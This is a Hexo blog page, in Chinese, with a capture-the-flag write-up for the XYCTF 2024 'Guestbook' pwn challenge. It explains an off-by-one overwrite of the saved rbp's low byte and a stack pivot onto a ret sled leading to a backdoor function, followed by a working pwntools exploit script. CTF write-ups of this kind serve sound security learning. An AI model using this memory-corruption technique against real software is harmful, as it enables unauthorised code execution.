@@ -1,0 +1,83 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.8.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.8.0" type="image/png" sizes="32x32"><meta name="description" content="xyctf2024       还是太菜，还要多练">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xyctf2024 pwn部分wp">
+<meta property="og:url" content="http://example.com/2024/05/07/xyctf/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="xyctf2024       还是太菜，还要多练">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/public/images/mdpicture/image-20240507225258841.png">
+<meta property="og:image" content="http://example.com/public/images/mdpicture/image-20240507225358022.png">
+<meta property="og:image" content="http://example.com/public/images/mdpicture/image-20240507225453122.png">
+<meta property="og:image" content="http://example.com/public/images/mdpicture/image-20240507225412803.png">
+<meta property="og:image" content="http://example.com/public/images/mdpicture/image-20240507230453297.png">
+<meta property="og:image" content="http://example.com/public/images/mdpicture/image-20240507231203026.png">
+<meta property="og:image" content="http://example.com/public/images/mdpicture/image-20240507231730453.png">
+<meta property="og:image" content="http://example.com/public/images/mdpicture/image-20240507231746437.png">
+<meta property="article:published_time" content="2024-05-07T14:50:51.948Z">
+<meta property="article:modified_time" content="2024-05-07T15:31:50.942Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/public/images/mdpicture/image-20240507225258841.png"><title>xyctf2024 pwn部分wp | Hexo</title><link ref="canonical" href="http://example.com/2024/05/07/xyctf/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.8.0"><link rel="stylesheet" href="css/custom.css"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":false,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 7.2.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner header-inner--height header-inner--bgcolor"><nav class="header-nav header-nav--sticky"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">xyctf2024 pwn部分wp</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2024-05-07</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-05-07</span></span></div></header><div class="post-body">
+        <h1 id="xyctf2024"   >
+          <a href="#xyctf2024" class="heading-link"><i class="fas fa-link"></i></a><a href="#xyctf2024" class="headerlink" title="xyctf2024"></a>xyctf2024</h1>
+      <p>还是太菜，还要多练</p>
+<p><em><span id="more"></span></em></p>
+
+        <h2 id="Guestbook"   >
+          <a href="#Guestbook" class="heading-link"><i class="fas fa-link"></i></a><a href="#Guestbook" class="headerlink" title="Guestbook"></a>Guestbook</h2>
+      <p>来看一道比较有意思的pwn题，先来看下保护措施</p>
+<p><img src="/../public/images/mdpicture/image-20240507225258841.png" alt="image-20240507225258841"></p>
+<p>拖进ida看一下</p>
+<p><img src="/../public/images/mdpicture/image-20240507225358022.png" alt="image-20240507225358022"></p>
+<p>题目中还存在着一个后门函数，进去看一下</p>
+<p><img src="/../public/images/mdpicture/image-20240507225453122.png" alt="image-20240507225453122"></p>
+<p>猜测这道题应该是想让我们把返回地址设置在这个地方，这个题没有开启PIE和canary，所以不用去考虑泄露main的基址和canary，再来看一下guestbook函数</p>
+<p><img src="/../public/images/mdpicture/image-20240507225412803.png" alt="image-20240507225412803"></p>
+<p>hhu表示每次读入一个字节的内容，初看觉得无法溢出，但是仔细想一下name数组的大小为32，数组下标应该是0-31，但是这个题没有对32进行检查，那么会出现一个什么后果呢，看下图</p>
+<p><img src="/../public/images/mdpicture/image-20240507230453297.png" alt="image-20240507230453297"></p>
+<p>由于rbp处存放prev_rbp,所以id+32其实是指向prev_rbp的最后一个字节，所以当我们使用32下标的时候，就会修改prev_rbp的最后一个字节，rbp被修改了，想到了什么？是的，栈迁移，当函数从guest返回至main的时候执行一次leave ret，从main函数返回的时候又会执行一次，所以两次leave ret的条件有了，程序最后会将rsp指向被修改的prev_ebp指向的位置（有点绕），看图</p>
+<p><img src="/../public/images/mdpicture/image-20240507231203026.png" alt="image-20240507231203026"></p>
+<p>那么被修改后的prev_rbp会指向哪呢，rbp只是被修改了最后一个字节，所以指向的位置还是栈上的某个位置，因为地址随机化，我们不知道具体的位置，调试看一下是不是我们想的这样</p>
+<p><img src="/../public/images/mdpicture/image-20240507231730453.png" alt="image-20240507231730453"></p>
+<p>index 输入32，id输入0，我们可以看到rbp确实被改变了</p>
+<p><img src="/../public/images/mdpicture/image-20240507231746437.png" alt="image-20240507231746437"></p>
+<p>既然我们能控制返回地址位于栈上的某个随机的位置，那接下来该怎么办？</p>
+<p>我们可以在站上部署一系列的ret指令的地址，既然最后的返回地址随机，那我们干脆把栈填满ret最后再补上一个backdoor的地址不就可以了，我们尽量让地址小一些，目的是使prev_rbp能指向Guestbook函数的栈空间，所以我们把最后一个字节填为0，上图这种情况可以改变rbp但是不能使rbp指向我们构造的一系列ret和backdoor，所以运行的时候有几率会失败，多试几次就好了</p>
+
+        <h2 id="思路"   >
+          <a href="#思路" class="heading-link"><i class="fas fa-link"></i></a><a href="#思路" class="headerlink" title="思路"></a>思路</h2>
+      <p>在栈上部署一系列ret最后补上backdoor地址，然后溢出一个字节使栈迁移到栈上payload区域</p>
+
+        <h2 id="exp"   >
+          <a href="#exp" class="heading-link"><i class="fas fa-link"></i></a><a href="#exp" class="headerlink" title="exp"></a>exp</h2>
+      <figure class="highlight py"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">backdoor=<span class="number">0x40133A</span></span><br><span class="line">payload=p64(ret)*<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;index\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(i).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;name:\n&#x27;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;id:\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;index\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;32&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;name:\n&quot;</span>)</span><br><span class="line">payload=p64(ret)+p64(backdoor)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;id:\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;index\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>
+
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><nav class="post-paginator paginator"><div class="paginator-next"><a class="paginator-next__link" href="/2024/04/30/test/"><span class="paginator-prev__text">test</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#xyctf2024"><span class="toc-number">1.</span> <span class="toc-text">
+          xyctf2024</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Guestbook"><span class="toc-number">1.1.</span> <span class="toc-text">
+          Guestbook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">1.2.</span> <span class="toc-text">
+          思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">1.3.</span> <span class="toc-text">
+          exp</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/aa.png" alt="avatar"></div><p class="sidebar-ov-author__text">n3gative25</p></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="/images/qq.jpg" target="_blank" rel="noopener" data-popover="QQ" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-qq"></i></span></a></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">3</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">Categories</div></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div>寻找属于自己的25号底片</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.8.0"></script><script src="/js/stun-boot.js?v=2.8.0"></script><script src="/js/scroll.js?v=2.8.0"></script><script src="/js/header.js?v=2.8.0"></script><script src="/js/sidebar.js?v=2.8.0"></script></body></html>
